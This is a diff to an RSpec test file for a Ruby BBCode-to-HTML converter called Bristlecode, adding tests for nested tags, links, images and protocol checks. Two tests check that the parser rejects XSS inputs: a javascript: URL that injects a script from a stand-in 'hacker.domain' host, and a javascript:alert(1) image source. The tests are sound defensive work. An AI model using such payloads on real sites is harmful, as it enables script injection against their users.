@@ -14,7 +14,8 @@ module Bristlecode
     end
 
     it 'handles empty documents' do
-      expect(to_html("      \t   \n    \n     \t")).to eq("")
+      text = "      \t   \n    \n     \t"
+      expect(to_html(text)).to eq(text)
     end
 
     it 'handles special chars' do
@@ -37,12 +38,12 @@ module Bristlecode
 
     it 'can nest tags' do
       doc = '[b] bold [i] italic [/i] bold [/b]'
-      expected = '<b>bold<i>italic</i>bold</b>'
+      expected = '<b> bold <i> italic </i> bold </b>'
       out = to_html(doc)
       expect(out).to eq(expected)
 
       doc = '[i] italic [b] bold [/b] italic [/i]'
-      expected = '<i>italic<b>bold</b>italic</i>'
+      expected = '<i> italic <b> bold </b> italic </i>'
       out = to_html(doc)
       expect(out).to eq(expected)
     end
@@ -74,8 +75,27 @@ module Bristlecode
       expect(to_html(input)).to eq(output)
     end
 
+    it 'allows subtrees in <a> tags' do
+      input = '[url=http://google.com]this is [b]the[/b] google[/url]'
+      output = '<a href="http://google.com" rel="nofollow">this is <b>the</b> google</a>'
+      expect(to_html(input)).to eq(output)
+    end
+
+    it 'rejects bad url protocols' do
+      input = "[url=javascript:t=document.createElement('script');t.src='//hacker.domain/script.js';document.body.appendChild(t);//]test[/url]"
+      expect { to_html(input) }.to raise_error
+
+      input = "[url=ftp://whatever.com/etc]warez[/url]"
+      expect { to_html(input) }.to raise_error
+    end
+
     it 'renders a linebreak' do
       expect(to_html('[br]')).to eq('<br>')
+    end
+
+    it 'handles images' do
+      input = '[img]http://example.com/cat.gif[/img]'
+      expect(to_html(input)).to eq('<img src="http://example.com/cat.gif">')
     end
   end
 
@@ -188,6 +208,18 @@ module Bristlecode
     describe '#linebreak' do
       it 'does its thing' do
         expect(parser.linebreak).to parse('[br]')
+      end
+    end
+
+    describe '#img' do
+      it 'accepts valid image urls' do
+        expect(parser.img).to parse('[img]http://example.com/something.gif[/img]')
+        expect(parser.img).to parse('[img]https://example.com/something.gif[/img]')
+      end
+
+      it 'rejects bad protocols' do
+        expect(parser.img).not_to parse('[img]ftp://example.com/something.gif[/img]')
+        expect(parser.img).not_to parse('[img]javascript:alert(1);[/img]')
       end
     end
   end
